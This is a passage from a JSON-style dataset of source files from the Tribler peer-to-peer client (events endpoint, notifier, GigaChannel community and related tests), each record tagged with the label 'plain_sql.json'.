self.session.add_observer(self.on_market_transaction_complete,\n                                  NTFY_MARKET_ON_TRANSACTION_COMPLETE, [NTFY_UPDATE])\n        self.session.add_observer(self.on_market_payment_received, NTFY_MARKET_ON_PAYMENT_RECEIVED, [NTFY_UPDATE])\n        self.session.add_observer(self.on_market_payment_sent, NTFY_MARKET_ON_PAYMENT_SENT, [NTFY_UPDATE])\n        self.session.add_observer(self.on_resource_event, SIGNAL_RESOURCE_CHECK, [SIGNAL_LOW_SPACE])\n        self.session.add_observer(self.on_credit_minig_error, NTFY_CREDIT_MINING, [NTFY_ERROR])\n        self.session.add_observer(self.on_shutdown, NTFY_TRIBLER, [STATE_SHUTDOWN])\n        self.session.add_observer(self.on_circuit_removed, NTFY_TUNNEL, [NTFY_REMOVE])\n\n    def write_data(self, message):\n        \"\"\"\n        Write data over the event socket if it's open.\n        \"\"\"\n        try:\n            message_str = json.dumps(message)\n        except UnicodeDecodeError:\n            # The message contains invalid characters; fix them\n            message_str = json.dumps(fix_unicode_dict(message))\n\n        if len(self.events_requests) == 0:\n            return\n        else:\n            [request.write(message_str + '\\n') for request in self.events_requests]\n\n    def on_upgrader_started(self, subject, changetype, objectID, *args):\n        self.write_data({\"type\": \"upgrader_started\"})\n\n    def on_upgrader_finished(self, subject, changetype, objectID, *args):\n        self.write_data({\"type\": \"upgrader_finished\"})\n\n    def on_upgrader_tick(self, subject, changetype, objectID, *args):\n        self.write_data({\"type\": \"upgrader_tick\", \"event\": {\"text\": args[0]}})\n\n    def on_watch_folder_corrupt_torrent(self, subject, changetype, objectID, *args):\n        self.write_data({\"type\": \"watch_folder_corrupt_torrent\", \"event\": {\"name\": args[0]}})\n\n    def on_new_version_available(self, subject, changetype, objectID, *args):\n        self.write_data({\"type\": \"new_version_available\", \"event\": {\"version\": args[0]}})\n\n    def on_tribler_started(self, subject, changetype, objectID, *args):\n        self.write_data({\"type\": \"tribler_started\"})\n\n    def on_channel_discovered(self, subject, changetype, objectID, *args):\n        self.write_data({\"type\": \"channel_discovered\", \"event\": args[0]})\n\n    def on_torrent_discovered(self, subject, changetype, objectID, *args):\n        self.write_data({\"type\": \"torrent_discovered\", \"event\": args[0]})\n\n    def on_torrent_finished(self, subject, changetype, objectID, *args):\n        self.write_data({\"type\": \"torrent_finished\", \"event\": {\"infohash\": hexlify(objectID), \"name\": args[0]}})\n\n    def on_torrent_error(self, subject, changetype, objectID, *args):\n        self.write_data({\"type\": \"torrent_error\", \"event\": {\"infohash\": hexlify(objectID), \"error\": args[0]}})\n\n    def on_torrent_info_updated(self, subject, changetype, objectID, *args):\n        self.write_data({\"type\": \"torrent_info_updated\", \"event\": dict(infohash=hexlify(objectID), **args[0])})\n\n    def on_tribler_exception(self, exception_text):\n        self.write_data({\"type\": \"tribler_exception\", \"event\": {\"text\": exception_text}})\n\n    def on_market_ask(self, subject, changetype, objectID, *args):\n        self.write_data({\"type\": \"market_ask\", \"event\": args[0]})\n\n    def on_market_bid(self, subject, changetype, objectID, *args):\n        self.write_data({\"type\": \"market_bid\", \"event\": args[0]})\n\n    def on_market_ask_timeout(self, subject, changetype, objectID, *args):\n        self.write_data({\"type\": \"market_ask_timeout\", \"event\": args[0]})\n\n    def on_market_bid_timeout(self, subject, changetype, objectID, *args):\n        self.write_data({\"type\": \"market_bid_timeout\", \"event\": args[0]})\n\n    def on_market_transaction_complete(self, subject, changetype, objectID, *args):\n        self.write_data({\"type\": \"market_transaction_complete\", \"event\": args[0]})\n\n    def on_market_payment_received(self, subject, changetype, objectID, *args):\n        self.write_data({\"type\": \"market_payment_received\", \"event\": args[0]})\n\n    def on_market_payment_sent(self, subject, changetype, objectID, *args):\n        self.write_data({\"type\": \"market_payment_sent\", \"event\": args[0]})\n\n    def on_resource_event(self, subject, changetype, objectID, *args):\n        self.write_data({\"type\": changetype, \"event\": args[0]})\n\n    def on_credit_minig_error(self, subject, changetype, ojbectID, *args):\n        self.write_data({\"type\": \"credit_mining_error\", \"event\": args[0]})\n\n    def on_shutdown(self, subject, changetype, objectID, *args):\n        self.write_data({\"type\": \"shutdown\", \"event\": args[0]})\n\n    def on_circuit_removed(self, subject, changetype, circuit, *args):\n        if isinstance(circuit, Circuit):\n            event = {\n                \"circuit_id\": circuit.circuit_id,\n                \"bytes_up\": circuit.bytes_up,\n                \"bytes_down\": circuit.bytes_down,\n                \"uptime\": time.time() - circuit.creation_time\n            }\n            self.write_data({\"type\": \"circuit_removed\", \"event\": event})\n\n    def render_GET(self, request):\n        \"\"\"\n        .. http:get:: /events\n\n        A GET request to this endpoint will open the event connection.\n\n            **Example request**:\n\n                .. sourcecode:: none\n\n                    curl -X GET http://localhost:8085/events\n        \"\"\"\n\n        def on_request_finished(_):\n            self.events_requests.remove(request)\n\n        self.events_requests.append(request)\n        request.notifyFinish().addCallbacks(on_request_finished, on_request_finished)\n\n        request.write(json.dumps({\"type\": \"events_start\", \"event\": {\n            \"tribler_started\": self.session.lm.initComplete, \"version\": version_id}}) + '\\n')\n\n        return server.NOT_DONE_YET\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/Tribler/tribler/blob/f731693201bbb1e74e2c0ef22a93567d81f171c1",
        "file_path": "/Tribler/Core/Notifier.py",
        "source": "\"\"\"\nNotifier.\n\nAuthor(s): Jelle Roozenburg\n\"\"\"\nimport logging\nimport threading\n\nfrom Tribler.Core.simpledefs import (NTFY_TORRENTS, NTFY_PLAYLISTS, NTFY_COMMENTS,\n                                     NTFY_MODIFICATIONS, NTFY_MODERATIONS, NTFY_MARKINGS, NTFY_MYPREFERENCES,\n                                     NTFY_ACTIVITIES, NTFY_REACHABLE, NTFY_CHANNELCAST, NTFY_VOTECAST, NTFY_DISPERSY,\n                                     NTFY_TRACKERINFO, NTFY_UPDATE, NTFY_INSERT, NTFY_DELETE, NTFY_TUNNEL,\n                                     NTFY_STARTUP_TICK, NTFY_CLOSE_TICK, NTFY_UPGRADER,\n                                     SIGNAL_ALLCHANNEL_COMMUNITY, SIGNAL_SEARCH_COMMUNITY, SIGNAL_TORRENT,\n                                     SIGNAL_CHANNEL, SIGNAL_CHANNEL_COMMUNITY, SIGNAL_RSS_FEED,\n                                     NTFY_WATCH_FOLDER_CORRUPT_TORRENT, NTFY_NEW_VERSION, NTFY_TRIBLER,\n                                     NTFY_UPGRADER_TICK, NTFY_TORRENT, NTFY_CHANNEL, NTFY_MARKET_ON_ASK,\n                                     NTFY_MARKET_ON_BID, NTFY_MARKET_ON_TRANSACTION_COMPLETE,\n                                     NTFY_MARKET_ON_ASK_TIMEOUT, NTFY_MARKET_ON_BID_TIMEOUT,\n                                     NTFY_MARKET_IOM_INPUT_REQUIRED, NTFY_MARKET_ON_PAYMENT_RECEIVED,\n                                     NTFY_MARKET_ON_PAYMENT_SENT, SIGNAL_RESOURCE_CHECK, NTFY_CREDIT_MINING,\n                                     STATE_SHUTDOWN)\n\n\nclass Notifier(object):\n\n    SUBJECTS = [NTFY_TORRENTS, NTFY_PLAYLISTS, NTFY_COMMENTS, NTFY_MODIFICATIONS, NTFY_MODERATIONS, NTFY_MARKINGS,\n                NTFY_MYPREFERENCES, NTFY_ACTIVITIES, NTFY_REACHABLE, NTFY_CHANNELCAST, NTFY_CLOSE_TICK, NTFY_DISPERSY,\n                NTFY_STARTUP_TICK, NTFY_TRACKERINFO, NTFY_TUNNEL, NTFY_UPGRADER, NTFY_VOTECAST,\n                SIGNAL_ALLCHANNEL_COMMUNITY, SIGNAL_CHANNEL, SIGNAL_CHANNEL_COMMUNITY, SIGNAL_RSS_FEED,\n                SIGNAL_SEARCH_COMMUNITY, SIGNAL_TORRENT, NTFY_WATCH_FOLDER_CORRUPT_TORRENT, NTFY_NEW_VERSION,\n                NTFY_TRIBLER, NTFY_UPGRADER_TICK, NTFY_TORRENT, NTFY_CHANNEL, NTFY_MARKET_ON_ASK, NTFY_MARKET_ON_BID,\n                NTFY_MARKET_ON_ASK_TIMEOUT, NTFY_MARKET_ON_BID_TIMEOUT, NTFY_MARKET_ON_TRANSACTION_COMPLETE,\n                NTFY_MARKET_ON_PAYMENT_RECEIVED, NTFY_MARKET_ON_PAYMENT_SENT, NTFY_MARKET_IOM_INPUT_REQUIRED,\n                SIGNAL_RESOURCE_CHECK, NTFY_CREDIT_MINING, STATE_SHUTDOWN]\n\n    def __init__(self):\n        self._logger = logging.getLogger(self.__class__.__name__)\n\n        self.observers = []\n        self.observerscache = {}\n        self.observertimers = {}\n        self.observerLock = threading.Lock()\n\n    def add_observer(self, func, subject, changeTypes=None, id=None, cache=0):\n        changeTypes = changeTypes or [NTFY_UPDATE, NTFY_INSERT, NTFY_DELETE]\n        \"\"\"\n        Add observer function which will be called upon certain event\n        Example:\n        addObserver(NTFY_TORRENTS, [NTFY_INSERT,NTFY_DELETE]) -> get callbacks\n                    when peers are added or deleted\n        addObserver(NTFY_TORRENTS, [NTFY_SEARCH_RESULT], 'a_search_id') -> get\n                    callbacks when peer-searchresults of of search\n                    with id=='a_search_id' come in\n        \"\"\"\n        assert isinstance(changeTypes, list)\n        assert subject in self.SUBJECTS, 'Subject %s not in SUBJECTS' % subject\n\n        obs = (func, subject, changeTypes, id, cache)\n        self.observerLock.acquire()\n        self.observers.append(obs)\n        self.observerLock.release()\n\n    def remove_observer(self, func):\n        \"\"\" Remove all observers with function func\n        \"\"\"\n        with self.observerLock:\n            i = 0\n            while i < len(self.observers):\n                ofunc = self.observers[i][0]\n                if ofunc == func:\n                    del self.observers[i]\n                else:\n                    i += 1\n\n    def remove_observers(self):\n        with self.observerLock:\n            for timer in self.observertimers.values():\n                timer.cancel()\n            self.observerscache = {}\n            self.observertimers = {}\n            self.observers = []\n\n    def notify(self, subject, changeType, obj_id, *args):\n        \"\"\"\n        Notify all interested observers about an event with threads from the pool\n        \"\"\"\n        tasks = []\n        assert subject in self.SUBJECTS, 'Subject %s not in SUBJECTS' % subject\n\n        args = [subject, changeType, obj_id] + list(args)\n\n        self.observerLock.acquire()\n        for ofunc, osubject, ochangeTypes, oid, cache in self.observers:\n            try:\n                if (subject == osubject and\n                    changeType in ochangeTypes and\n                        (oid is None or oid == obj_id)):\n\n                    if not cache:\n                        tasks.append(ofunc)\n                    else:\n                        if ofunc not in self.observerscache:\n                            def doQueue(ofunc):\n                                self.observerLock.acquire()\n                                if ofunc in self.observerscache:\n                                    events = self.observerscache[ofunc]\n                                    del self.observerscache[ofunc]\n                                    del self.observertimers[ofunc]\n                                else:\n                                    events = []\n                                self.observerLock.release()\n\n                                if events:\n                                    ofunc(events)\n\n                            t = threading.Timer(cache, doQueue, (ofunc,))\n                            t.setName(\"Notifier-timer-%s\" % subject)\n                            t.start()\n\n                            self.observerscache[ofunc] = []\n                            self.observertimers[ofunc] = t\n\n                        self.observerscache[ofunc].append(args)\n            except:\n                self._logger.exception(\"OIDs were %s %s\", repr(oid), repr(obj_id))\n\n        self.observerLock.release()\n        for task in tasks:\n            task(*args)  # call observer function in this thread\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/Tribler/tribler/blob/f731693201bbb1e74e2c0ef22a93567d81f171c1",
        "file_path": "/Tribler/Test/Community/gigachannel/test_community.py",
        "source": "from __future__ import absolute_import\n\nimport os\n\nfrom pony.orm import db_session\n\nfrom six.moves import xrange\n\nfrom twisted.internet.defer import inlineCallbacks\n\nfrom Tribler.Core.Modules.MetadataStore.OrmBindings.channel_node import NEW\nfrom Tribler.Core.Modules.MetadataStore.store import MetadataStore\nfrom Tribler.Core.Utilities.random_utils import random_infohash\nfrom Tribler.community.gigachannel.community import GigaChannelCommunity\nfrom Tribler.pyipv8.ipv8.keyvault.crypto import default_eccrypto\nfrom Tribler.pyipv8.ipv8.peer import Peer\nfrom Tribler.pyipv8.ipv8.test.base import TestBase\n\n\nclass TestGigaChannelUnits(TestBase):\n    \"\"\"\n    Unit tests for the GigaChannel community which do not need a real Session.\n    \"\"\"\n\n    def setUp(self):\n        super(TestGigaChannelUnits, self).setUp()\n        self.count = 0\n        self.initialize(GigaChannelCommunity, 2)\n\n    def create_node(self, *args, **kwargs):\n        metadata_store = MetadataStore(os.path.join(self.temporary_directory(), \"%d.db\" % self.count),\n                                       self.temporary_directory(), default_eccrypto.generate_key(u\"curve25519\"))\n        kwargs['metadata_store'] = metadata_store\n        node = super(TestGigaChannelUnits, self).create_node(*args, **kwargs)\n        self.count += 1\n        return node\n\n    def add_random_torrent(self, metadata_cls):\n        torrent_metadata = metadata_cls.from_dict({\n            \"infohash\": random_infohash(),\n            \"title\": \"test\",\n            \"tags\": \"\",\n            \"size\": 1234,\n            \"status\": NEW\n        })\n        torrent_metadata.sign()\n\n    @inlineCallbacks\n    def test_send_random_one_channel(self):\n        \"\"\"\n        Test whether sending a single channel with a single torrent to another peer works correctly\n        \"\"\"\n        with db_session:\n            channel = self.nodes[0].overlay.metadata_store.ChannelMetadata.create_channel(\"test\", \"bla\")\n            self.add_random_torrent(self.nodes[0].overlay.metadata_store.TorrentMetadata)\n            channel.commit_channel_torrent()\n\n        self.nodes[0].overlay.send_random_to(Peer(self.nodes[1].my_peer.public_key, self.nodes[1].endpoint.wan_address))\n\n        yield self.deliver_messages()\n\n        with db_session:\n            self.assertEqual(len(self.nodes[1].overlay.metadata_store.ChannelMetadata.select()), 1)\n            channel = self.nodes[1].overlay.metadata_store.ChannelMetadata.select()[:][0]\n            self.assertEqual(channel.contents_len, 1)\n\n    @inlineCallbacks\n    def test_send_random_multiple_torrents(self):\n        \"\"\"\n        Test whether sending a single channel with a multiple torrents to another peer works correctly\n        \"\"\"\n        with db_session:\n            channel = self.nodes[0].overlay.metadata_store.ChannelMetadata.create_channel(\"test\", \"bla\")\n            for _ in xrange(20):\n                self.add_random_torrent(self.nodes[0].overlay.metadata_store.TorrentMetadata)\n            channel.commit_channel_torrent()\n\n        self.nodes[0].overlay.send_random_to(Peer(self.nodes[1].my_peer.public_key, self.nodes[1].endpoint.wan_address))\n\n        yield self.deliver_messages()\n\n        with db_session:\n            self.assertEqual(len(self.nodes[1].overlay.metadata_store.ChannelMetadata.select()), 1)\n            channel = self.nodes[1].overlay.metadata_store.ChannelMetadata.select()[:][0]\n            self.assertLess(channel.contents_len, 20)\n\n    @inlineCallbacks\n    def test_send_and_get_channel_update_back(self):\n        \"\"\"\n        Test if sending back information on updated version of a channel works\n        \"\"\"\n        with db_session:\n            # Add channel to node 0\n            channel = self.nodes[0].overlay.metadata_store.ChannelMetadata.create_channel(\"test\", \"bla\")\n            for _ in xrange(20):\n                self.add_random_torrent(self.nodes[0].overlay.metadata_store.TorrentMetadata)\n            channel.commit_channel_torrent()\n            channel_v1_dict = channel.to_dict()\n            channel_v1_dict.pop(\"health\")\n            self.add_random_torrent(self.nodes[0].overlay.metadata_store.TorrentMetadata)\n            channel.commit_channel_torrent()\n\n            # Add the outdated version of the channel to node 1\n            self.nodes[1].overlay.metadata_store.ChannelMetadata.from_dict(channel_v1_dict)\n\n        # node1 --outdated_channel--> node0\n        self.nodes[1].overlay.send_random_to(Peer(self.nodes[0].my_peer.public_key, self.nodes[0].endpoint.wan_address))\n\n        yield self.deliver_messages(0.5)\n\n        with db_session:\n            self.assertEqual(self.nodes[1].overlay.metadata_store.ChannelMetadata.select()[:][0].timestamp,\n                             self.nodes[0].overlay.metadata_store.ChannelMetadata.select()[:][0].timestamp)\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/Tribler/tribler/blob/f731693201bbb1e74e2c0ef22a93567d81f171c1",
        "file_path": "/Tribler/Test/Core/Modules/RestApi/test_events_endpoint.py",
        "source": "from __future__ import absolute_import\n\nimport logging\n\nfrom twisted.internet import reactor\nfrom twisted.internet.defer import Deferred, inlineCallbacks\nfrom twisted.internet.protocol import Protocol\nfrom twisted.internet.task import deferLater\nfrom twisted.web.client import Agent, HTTPConnectionPool\nfrom twisted.web.http_headers import Headers\n\nimport Tribler.Core.Utilities.json_util as json\nfrom Tribler.Core.simpledefs import NTFY_CHANNEL, NTFY_CREDIT_MINING, NTFY_DISCOVERED, NTFY_ERROR, NTFY_FINISHED,\\\n    NTFY_INSERT, NTFY_MARKET_ON_ASK, NTFY_MARKET_ON_ASK_TIMEOUT, NTFY_MARKET_ON_BID, NTFY_MARKET_ON_BID_TIMEOUT,\\\n    NTFY_MARKET_ON_PAYMENT_RECEIVED, NTFY_MARKET_ON_PAYMENT_SENT, NTFY_MARKET_ON_TRANSACTION_COMPLETE,\\\n    NTFY_NEW_VERSION, NTFY_REMOVE, NTFY_STARTED, NTFY_TORRENT, NTFY_TUNNEL, NTFY_UPDATE, NTFY_UPGRADER,\\\n    NTFY_UPGRADER_TICK, NTFY_WATCH_FOLDER_CORRUPT_TORRENT, SIGNAL_LOW_SPACE, SIGNAL_RESOURCE_CHECK\nfrom Tribler.Core.version import version_id\nfrom Tribler.Test.Core.Modules.RestApi.base_api_test import AbstractApiTest\nfrom Tribler.Test.tools import trial_timeout\nfrom Tribler.pyipv8.ipv8.messaging.anonymization.tunnel import Circuit\n\n\nclass EventDataProtocol(Protocol):\n    \"\"\"\n    This class is responsible for reading the data received over the event socket.\n    \"\"\"\n\n    def __init__(self, messages_to_wait_for, finished, response):\n        self.json_buffer = []\n        self._logger = logging.getLogger(self.__class__.__name__)\n        self.messages_to_wait_for = messages_to_wait_for + 1  # The first event message is always events_start\n        self.finished = finished\n        self.response = response\n\n    def dataReceived(self, data):\n        self._logger.info(\"Received data: %s\" % data)\n        self.json_buffer.append(json.loads(data))\n        self.messages_to_wait_for -= 1\n        if self.messages_to_wait_for == 0:\n            self.response.loseConnection()\n\n    def connectionLost(self, reason=\"done\"):\n        self.finished.callback(self.json_buffer[1:])\n\n\nclass TestEventsEndpoint(AbstractApiTest):\n\n    @inlineCallbacks\n    def setUp(self):\n        yield super(TestEventsEndpoint, self).setUp()\n        self.events_deferred = Deferred()\n        self.connection_pool = HTTPConnectionPool(reactor, False)\n        self.socket_open_deferred = self.tribler_started_deferred.addCallback(self.open_events_socket)\n        self.messages_to_wait_for = 0\n\n    @inlineCallbacks\n    def tearDown(self):\n        yield self.close_connections()\n\n        # Wait to make sure the HTTPChannel is closed, see https://twistedmatrix.com/trac/ticket/2447\n        yield deferLater(reactor, 0.3, lambda: None)\n\n        yield super(TestEventsEndpoint, self).tearDown()\n\n    def on_event_socket_opened(self, response):\n        response.deliverBody(EventDataProtocol(self.messages_to_wait_for, self.events_deferred, response))\n\n    def open_events_socket(self, _):\n        agent = Agent(reactor, pool=self.connection_pool)\n        return agent.request('GET', 'http://localhost:%s/events' % self.session.config.get_http_api_port(),\n                             Headers({'User-Agent': ['Tribler ' + version_id]}), None) \\\n            .addCallback(self.on_event_socket_opened)\n\n    def close_connections(self):\n        return self.connection_pool.closeCachedConnections()\n\n    @trial_timeout(20)\n    def test_events(self):\n        \"\"\"\n        Testing whether various events are coming through the events endpoints\n        \"\"\"\n        self.messages_to_wait_for = 20\n\n        def send_notifications(_):\n            self.session.notifier.notify(NTFY_UPGRADER, NTFY_STARTED, None, None)\n            self.session.notifier.notify(NTFY_UPGRADER_TICK, NTFY_STARTED, None, None)\n            self.session.notifier.notify(NTFY_UPGRADER, NTFY_FINISHED, None, None)\n            self.session.notifier.notify(NTFY_WATCH_FOLDER_CORRUPT_TORRENT, NTFY_INSERT, None, None)\n            self.session.notifier.notify(NTFY_NEW_VERSION, NTFY_INSERT, None, None)\n            self.session.notifier.notify(NTFY_CHANNEL, NTFY_DISCOVERED, None, None)\n            self.session.notifier.notify(NTFY_TORRENT, NTFY_DISCOVERED, None, {'a': 'Invalid character \\xa1'})\n            self.session.notifier.notify(NTFY_TORRENT, NTFY_FINISHED, 'a' * 10, None)\n            self.session.notifier.notify(NTFY_TORRENT, NTFY_ERROR, 'a' * 10, 'This is an error message')\n            self.session.notifier.notify(NTFY_MARKET_ON_ASK, NTFY_UPDATE, None, {'a': 'b'})\n            self.session.notifier.notify(NTFY_MARKET_ON_BID, NTFY_UPDATE, None, {'a': 'b'})\n            self.session.notifier.notify(NTFY_MARKET_ON_ASK_TIMEOUT, NTFY_UPDATE, None, {'a': 'b'})\n            self.session.notifier.notify(NTFY_MARKET_ON_BID_TIMEOUT, NTFY_UPDATE, None, {'a': 'b'})\n            self.session.notifier.notify(NTFY_MARKET_ON_TRANSACTION_COMPLETE, NTFY_UPDATE, None, {'a': 'b'})\n            self.session.notifier.notify(NTFY_MARKET_ON_PAYMENT_RECEIVED, NTFY_UPDATE, None, {'a': 'b'})\n            self.session.notifier.notify(NTFY_MARKET_ON_PAYMENT_SENT, NTFY_UPDATE, None, {'a': 'b'})\n            self.session.notifier.notify(SIGNAL_RESOURCE_CHECK, SIGNAL_LOW_SPACE, None, {})\n            self.session.notifier.notify(NTFY_CREDIT_MINING, NTFY_ERROR, None, {\"message\": \"Some credit mining error\"})\n            self.session.notifier.notify(NTFY_TUNNEL, NTFY_REMOVE, Circuit(1234, None), 'test')\n            self.session.lm.api_manager.root_endpoint.events_endpoint.on_tribler_exception(\"hi\")\n\n        self.socket_open_deferred.addCallback(send_notifications)\n\n        return self.events_deferred\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/Tribler/tribler/blob/f731693201bbb1e74e2c0ef22a93567d81f171c1",
        "file_path": "/Tribler/Test/Core/Utilities/test_utilities.py",
        "source": "from __future__ import absolute_import\n\nfrom twisted.internet import reactor\nfrom twisted.internet.defer import inlineCallbacks, maybeDeferred\nfrom twisted.web.server import Site\nfrom twisted.web.util import Redirect\n\nfrom Tribler.Core.Utilities.network_utils import get_random_port\nfrom Tribler.Core.Utilities.utilities import http_get, is_valid_url, parse_magnetlink\nfrom Tribler.Test.test_as_server import AbstractServer\nfrom Tribler.Test.tools import trial_timeout\n\n\nclass TestMakeTorrent(AbstractServer):\n\n    def __init__(self, *argv, **kwargs):\n        super(TestMakeTorrent, self).__init__(*argv, **kwargs)\n        self.http_server = None\n\n    def setUpHttpRedirectServer(self, port, redirect_url):\n        self.http_server = reactor.listenTCP(port, Site(Redirect(redirect_url)))\n\n    @inlineCallbacks\n    def tearDown(self):\n        if self.http_server:\n            yield maybeDeferred(self.http_server.stopListening)\n        yield super(TestMakeTorrent, self).tearDown()\n\n    def test_parse_magnetlink_lowercase(self):\n        \"\"\"\n        Test if a lowercase magnet link can be parsed\n        \"\"\"\n        _, hashed, _ = parse_magnetlink('magnet:?xt=urn:btih:apctqfwnowubxzoidazgaj2ba6fs6juc')\n\n        self.assertEqual(hashed, \"\\x03\\xc58\\x16\\xcdu\\xa8\\x1b\\xe5\\xc8\\x182`'A\\x07\\x8b/&\\x82\")\n\n    def test_parse_magnetlink_uppercase(self):\n        \"\"\"\n        Test if a lowercase magnet link can be parsed\n        \"\"\"\n        _, hashed, _ = parse_magnetlink('magnet:?xt=urn:btih:APCTQFWNOWUBXZOIDAZGAJ2BA6FS6JUC')\n\n        self.assertEqual(hashed, \"\\x03\\xc58\\x16\\xcdu\\xa8\\x1b\\xe5\\xc8\\x182`'A\\x07\\x8b/&\\x82\")\n\n    def test_valid_url(self):\n        \"\"\" Test if the URL is valid \"\"\"\n        test_url = \"http://anno nce.torrentsmd.com:8080/announce\"\n        self.assertFalse(is_valid_url(test_url), \"%s is not a valid URL\" % test_url)\n\n        test_url2 = \"http://announce.torrentsmd.com:8080/announce \"\n        self.assertTrue(is_valid_url(test_url2), \"%s is a valid URL\" % test_url2)\n\n        test_url3 = \"http://localhost:1920/announce\"\n        self.assertTrue(is_valid_url(test_url3))\n\n        test_url4 = \"udp://localhost:1264\"\n        self.assertTrue(is_valid_url(test_url4))\n\n    @trial_timeout(5)\n    def test_http_get_with_redirect(self):\n        \"\"\"\n        Test if http_get is working properly if url redirects to a magnet link.\n        \"\"\"\n\n        def on_callback(response):\n            self.assertEqual(response, magnet_link)\n\n        # Setup a redirect server which redirects to a magnet link\n        magnet_link = \"magnet:?xt=urn:btih:DC4B96CF85A85CEEDB8ADC4B96CF85A85CEEDB8A\"\n        port = get_random_port()\n\n        self.setUpHttpRedirectServer(port, magnet_link)\n\n        test_url = \"http://localhost:%d\" % port\n        http_deferred = http_get(test_url).addCallback(on_callback)\n\n        return http_deferred\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/Tribler/tribler/blob/f731693201bbb1e74e2c0ef22a93567d81f171c1",
        "file_path": "/Tribler/community/gigachannel/community.py",
        "source": "from __future__ import absolute_import\n\nfrom binascii import unhexlify\n\nfrom pony.orm import CacheIndexError, TransactionIntegrityError, db_session\n\nfrom Tribler.Core.Modules.MetadataStore.OrmBindings.channel_metadata import entries_to_chunk\nfrom Tribler.Core.Modules.MetadataStore.serialization import CHANNEL_TORRENT\nfrom Tribler.Core.Modules.MetadataStore.store import GOT_NEWER_VERSION\nfrom Tribler.pyipv8.ipv8.community import Community\nfrom Tribler.pyipv8.ipv8.lazy_community import lazy_wrapper\nfrom Tribler.pyipv8.ipv8.messaging.lazy_payload import VariablePayload\nfrom Tribler.pyipv8.ipv8.peer import Peer\n\nminimal_blob_size = 200\nmaximum_payload_size = 1024\nmax_entries = maximum_payload_size // minimal_blob_size\n\n\nclass RawBlobPayload(VariablePayload):\n    format_list = ['raw']\n    names = ['raw_blob']\n\n\nclass GigaChannelCommunity(Community):\n    \"\"\"\n    Community to gossip around gigachannels.\n    \"\"\"\n\n    master_peer = Peer(unhexlify(\"3081a7301006072a8648ce3d020106052b8104002703819200040448a078b597b62d3761a061872cd86\"\n                                 \"10f58cb513f1dc21e66dd59f1e01d582f633b182d9ca6e5859a9a34e61eb77b768e5e9202f642fd50c6\"\n                                 \"0b89d8d8b0bdc355cdf8caac262f6707c80da00b1bcbe7bf91ed5015e5163a76a2b2e630afac96925f5\"\n                                 \"daa8556605043c6da4db7d26113cba9f9cbe63fddf74625117598317e05cb5b8cbd606d0911683570ad\"\n                                 \"bb921c91\"))\n\n    NEWS_PUSH_MESSAGE = 1\n\n    def __init__(self, my_peer, endpoint, network, metadata_store):\n        super(GigaChannelCommunity, self).__init__(my_peer, endpoint, network)\n        self.metadata_store = metadata_store\n        self.add_message_handler(self.NEWS_PUSH_MESSAGE, self.on_blob)\n\n    def send_random_to(self, peer):\n        \"\"\"\n        Send random entries from our subscribed channels to another peer.\n\n        :param peer: the peer to send to\n        :type peer: Peer\n        :returns: None\n        \"\"\"\n        # Choose some random entries and try to pack them into maximum_payload_size bytes\n        md_list = []\n        with db_session:\n            # TODO: when the health table will be there, send popular torrents instead\n            channel_l = list(self.metadata_store.ChannelMetadata.get_random_channels(1, only_subscribed=True))\n            if not channel_l:\n                return\n            md_list.extend(channel_l + list(channel_l[0].get_random_torrents(max_entries - 1)))\n            blob = entries_to_chunk(md_list, maximum_payload_size)[0] if md_list else None\n        self.endpoint.send(peer.address, self.ezr_pack(self.NEWS_PUSH_MESSAGE, RawBlobPayload(blob)))\n\n    @lazy_wrapper(RawBlobPayload)\n    def on_blob(self, peer, blob):\n        \"\"\"\n        Callback for when a MetadataBlob message comes in.\n\n        :param peer: the peer that sent us the blob\n        :param blob: payload raw data\n        \"\"\"\n        try:\n            with db_session:\n                try:\n                    md_list = self.metadata_store.process_compressed_mdblob(blob.raw_blob)\n                except (TransactionIntegrityError, CacheIndexError) as err:\n                    self._logger.error(\"DB transaction error when tried to process payload: %s\", str(err))\n                    return\n        # Unfortunately, we have to catch the exception twice, because Pony can raise them both on the exit from\n        # db_session, and on calling the line of code\n        except (TransactionIntegrityError, CacheIndexError) as err:\n            self._logger.error(\"DB transaction error when tried to process payload: %s\", str(err))\n            return\n\n        # Check if the guy who send us this metadata actually has an older version of this md than\n        # we do, and queue to send it back.\n        with db_session:\n            reply_list = [md for md, result in md_list if\n                          (md and (md.metadata_type == CHANNEL_TORRENT)) and (result == GOT_NEWER_VERSION)]\n            reply_blob = entries_to_chunk(reply_list, maximum_payload_size)[0] if reply_list else None\n        if reply_blob:\n            self.endpoint.send(peer.address, self.ezr_pack(self.NEWS_PUSH_MESSAGE, RawBlobPayload(reply_blob)))\n\n\nclass GigaChannelTestnetCommunity(GigaChannelCommunity):\n    \"\"\"\n    This community defines a testnet for the giga channels, used for testing purposes.\n    \"\"\"\n    master_peer = Peer(unhexlify(\"3081a7301006072a8648ce3d020106052b81040027038192000401b9f303778e7727b35a4c26487481f\"\n                                 \"a7011e252cc4a6f885f3756bd8898c9620cf1c32e79dd5e75ae277a56702a47428ce47676d005e262fa\"\n                                 \"fd1a131a2cb66be744d52cb1e0fca503658cb3368e9ebe232e7b8c01e3172ebfdb0620b316467e5b2c4\"\n                                 \"c6809565cf2142e8d4322f66a3d13a8c4bb18059c9ed97975a97716a085a93e3e62b0387e63f0bf389a\"\n                                 \"0e9bffe6\"))\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/Tribler/tribler/blob/f731693201bbb1e74e2c0ef22a93567d81f171c1",
        "file_path": "/TriblerGUI/event_request_manager.py",
